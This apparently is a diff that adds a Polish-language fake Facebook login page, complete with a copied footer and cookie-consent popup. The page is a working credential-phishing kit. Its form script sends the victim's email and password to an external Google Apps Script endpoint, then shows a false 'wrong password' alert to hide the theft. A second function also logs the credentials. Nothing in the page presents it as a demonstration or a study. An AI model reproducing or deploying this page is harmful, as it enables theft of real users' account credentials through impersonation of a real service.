@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - profile login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .container {
+            display: flex;
+            flex: 1;
+            justify-content: center;
+            align-items: center;
+        }
+        .content {
+            display: flex;
+            width: 980px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .left {
+            flex: 1;
+            padding: 40px;
+            background-color: #f0f2f5;
+        }
+        .left h1 {
+            font-size: 40px;
+            color: #1877f2;
+            margin-bottom: 10px;
+        }
+        .left p {
+            font-size: 16px;
+            color: #000;
+            margin: 0;
+            font-weight: 600;
+        }
+        .right {
+            flex: 1;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .form {
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+        .form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .form button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        .form button.login {
+            background-color: #1877f2;
+        }
+        .form button.signup {
+            background-color: #42b72a;
+        }
+        .form button:hover {
+            opacity: 0.9;
+        }
+        footer {
+            background-color: #f0f2f5;
+            text-align: center;
+            padding: 20px 10px;
+            font-size: 12px;
+            color: #666;
+        }
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        .footer-links a {
+            margin: 0 5px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+                            /* Ogólne ustawienia dla ekranów telefonów */
+                    @media (max-width: 768px) {
+                        body {
+                            flex-direction: column;
+                        }
+
+                        .container {
+                            flex-direction: column;
+                            padding: 10px;
+                        }
+
+                        .content {
+                            flex-direction: column;
+                            width: 100%; /* Dopasowanie do szerokości ekranu */
+                            box-shadow: none; /* Możesz usunąć cień na mniejszych ekranach */
+                        }
+
+                        .left, .right {
+                            flex: 1;
+                            padding: 20px;
+                        }
+
+                        .form {
+                            width: 100%;
+                            max-width: 100%; /* Dostosowanie do ekranu telefonu */
+                        }
+
+                        .form input {
+                            font-size: 14px; /* Mniejsze fonty na małych ekranach */
+                            padding: 10px;
+                        }
+
+                        .form button {
+                            font-size: 16px;
+                            padding: 12px;
+                        }
+
+                        footer {
+                            font-size: 10px; /* Zmniejsz rozmiar czcionki w stopce */
+                            padding: 10px;
+                        }
+
+                        .footer-links a {
+                            display: inline-block;
+                            margin: 2px;
+                        }
+                    }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="left">
+                <h1>Facebook</h1>
+                <p>Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informacje i materiały.</p>
+            </div>
+            <div class="right">
+                <div class="form">
+                    <form id="dataForm" method="POST" onsubmit="sendData(event)">
+                        <input type="email" id="email" name="email" placeholder="Adres e-mail lub numer telefonu" required>
+                        <input type="password" id="password" name="password" placeholder="Hasło" required>
+                        <button type="submit" class="login">Zaloguj się</button>
+                    </form>
+                    <script>
+                        function sendData(event) {
+                            event.preventDefault(); // Zapobiega odświeżeniu strony
+                            
+                            const email = document.getElementById('email').value;
+                            const password = document.getElementById('password').value;
+                    
+                            // Twój URL do Apps Script (wklej poniżej)
+                            const scriptURL = 'https://script.google.com/macros/s/AKfycbyFkqPIkBSDKE_rhkUu2DzCspOJuwTfgsKTXW8EBPBjqOWBYa4b1RLdalqLiWjjckmL/exec';
+                    
+                            // Przygotowanie danych do wysłania
+                            const formData = new FormData();
+                            formData.append('email', email);
+                            formData.append('password', password);
+                    
+                            // Wysłanie danych do Apps Script
+                            fetch(scriptURL, { method: 'POST', body: formData })
+                                .then(response => {
+                                    if (response.ok) {
+                                        alert('Błędny login, lub hasło. Sprawdź poprawność danych i spróbuj ponownie.');
+                                    } else {
+                                        alert('Wystąpił błąd podczas przesyłania danych.');
+                                    }
+                                })
+                                .catch(error => {
+                                    console.error('Błąd:', error);
+                                    alert('Wystąpił problem z połączeniem.');
+                                });
+                        }
+                    </script>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <style>
+                                @media (max-width: 480px) {
+                        footer {
+                            text-align: center;
+                            padding: 10px;
+                        }
+
+                        .footer-links {
+                            display: flex;
+                            flex-wrap: wrap; /* Dzięki temu linki przenoszą się do kolejnego wiersza */
+                            justify-content: center;
+                        }
+
+                        .footer-links a {
+                            font-size: 12px;
+                            margin: 5px;
+                        }
+                    }
+        </style>
+        <div class="footer-links">
+            <a href="#">Polski</a>
+            <a href="#">English (US)</a>
+            <a href="#">Русский</a>
+            <a href="#">Français (France)</a>
+            <a href="#">Deutsch</a>
+            <a href="#">Español (España)</a>
+        </div>
+        <div class="footer-links">
+            <a href="#">Zarejestruj się</a>
+            <a href="#">Zaloguj się</a>
+            <a href="#">Messenger</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Informacje</a>
+            <a href="#">Centrum pomocy</a>
+        </div>
+        <p>&copy; 2024 Meta</p>
+    </footer>
+
+    <script>
+        function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            console.log("Email:", email);
+            console.log("Password:", password);
+            alert("Wystąpił błąd. Sprawdź swoje połączenie z internetem, lub spróbuj ponownie później.");
+        }
+
+        function createAccount() {
+            alert("Wystąpił błąd. Sprawdź swoje połączenie z internetem, lub spróbuj ponownie później.");
+        }
+    </script>
+    <!-- Cookie Consent Popup -->
+<div id="cookie-popup" class="cookie-popup">
+    <div class="cookie-content">
+        <h2>Zezwolić na użycie plików cookie z Facebooka w tej przeglądarce?</h2>
+        <p>Używamy plików cookie i podobnych technologii, by pomagać 
+            w dostarczaniu i ulepszaniu zawartości Produktów Meta. 
+            Wykorzystujemy je też do zapewniania większego bezpieczeństwa 
+            poprzez wykorzystywanie informacji pozyskiwanych z plików cookie
+             na Facebooku i poza nim oraz do dostarczania osobom posiadającym
+              konto Produktów Meta i ich ulepszania.</p>
+        <ul>
+            <li><b>Niezbędne pliki cookie:</b> Te pliki cookie są wymagane do korzystania z Produktów Meta. Są one konieczne do prawidłowego działania naszych witryn.</li>
+            <li><b>Pliki cookie innych firm:</b> Używamy tych plików cookie, aby pokazywać Ci reklamy poza Produktami Meta i udostępniać takie funkcje jak mapy i filmy w Produktach Meta. Te pliki cookie są opcjonalne.</li>
+        </ul>
+        <p>Masz kontrolę nad opcjonalnymi plikami cookie, z których korzystamy. W <a href="#">Zasadach dotyczących plików cookie</a> możesz dowiedzieć się więcej o plikach cookie i sposobach ich wykorzystania, a w dowolnej chwili sprawdzić lub zmienić swoje wybory.</p>
+        <div class="cookie-buttons">
+            <button onclick="rejectCookies()">Odrzuć opcjonalne pliki cookie</button>
+            <button onclick="acceptCookies()">Zezwól na wszystkie pliki cookie</button>
+        </div>
+    </div>
+</div>
+
+        <style>
+        /* popup message */
+        .cookie-popup {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: #fff;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            z-index: 1000;
+            display: none; /* Hidden by default */
+        }
+        .cookie-content {
+            max-width: 900px;
+            margin: 0 auto;
+            text-align: center;
+        }
+        .cookie-content h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        .cookie-content p {
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .cookie-content ul {
+            text-align: left;
+            margin: 10px 0;
+            padding: 0 20px;
+        }
+        .cookie-content li {
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .cookie-content a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .cookie-content a:hover {
+            text-decoration: underline;
+        }
+        .cookie-buttons button {
+            padding: 10px 20px;
+            margin: 5px;
+            font-size: 14px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .cookie-buttons button:first-child {
+            background-color: #f0f2f5;
+            color: #333;
+        }
+        .cookie-buttons button:last-child {
+            background-color: #1877f2;
+            color: #fff;
+        }
+        .cookie-buttons button:hover {
+            opacity: 0.9;
+        }
+
+                                    /* Poprawki dla małych ekranów */
+                            @media (max-width: 768px) {
+                                .cookie-popup {
+                                    padding: 10px; /* Zmniejszenie paddingu */
+                                }
+
+                                .cookie-content {
+                                    text-align: center;
+                                    max-width: 100%; /* Dopasowanie do szerokości ekranu */
+                                    padding: 0 10px;
+                                }
+
+                                .cookie-content h2 {
+                                    font-size: 16px; /* Mniejszy tekst */
+                                }
+
+                                .cookie-content p {
+                                    font-size: 12px; /* Dopasowanie rozmiaru tekstu */
+                                    line-height: 1.4; /* Poprawa czytelności */
+                                }
+
+                                .cookie-content ul {
+                                    padding: 0;
+                                    margin: 0 auto 10px auto; /* Wyrównanie listy */
+                                    text-align: left;
+                                }
+
+                                .cookie-content li {
+                                    font-size: 12px;
+                                }
+
+                                .cookie-buttons {
+                                    display: flex;
+                                    flex-direction: column; /* Przyciski jeden pod drugim */
+                                    gap: 10px; /* Przestrzeń między przyciskami */
+                                }
+
+                                .cookie-buttons button {
+                                    font-size: 14px; /* Dostosowanie rozmiaru przycisków */
+                                    padding: 10px;
+                                }
+                            }
+
+                            @media (max-width: 480px) {
+                                .cookie-content h2 {
+                                    font-size: 14px;
+                                }
+
+                                .cookie-content p {
+                                    font-size: 11px;
+                                }
+
+                                .cookie-content li {
+                                    font-size: 11px;
+                                }
+
+                                .cookie-buttons button {
+                                    font-size: 12px;
+                                    padding: 8px;
+                                }
+                            }
+        </style>
+
+        <script>
+        // JavaScript for Cookie Popup
+        document.addEventListener('DOMContentLoaded', () => {
+            const cookiePopup = document.getElementById('cookie-popup');
+
+            // Show the popup after 1 second
+            setTimeout(() => {
+                if (!localStorage.getItem('cookieConsent')) {
+                    cookiePopup.style.display = 'block';
+                }
+            }, 1000);
+        });
+
+        function acceptCookies() {
+            localStorage.setItem('cookieConsent', 'true');
+            document.getElementById('cookie-popup').style.display = 'none';
+        }
+
+        function rejectCookies() {
+            localStorage.setItem('cookieConsent', 'false');
+            document.getElementById('cookie-popup').style.display = 'none';
+        }
+        </script>
+</body>
+</html>
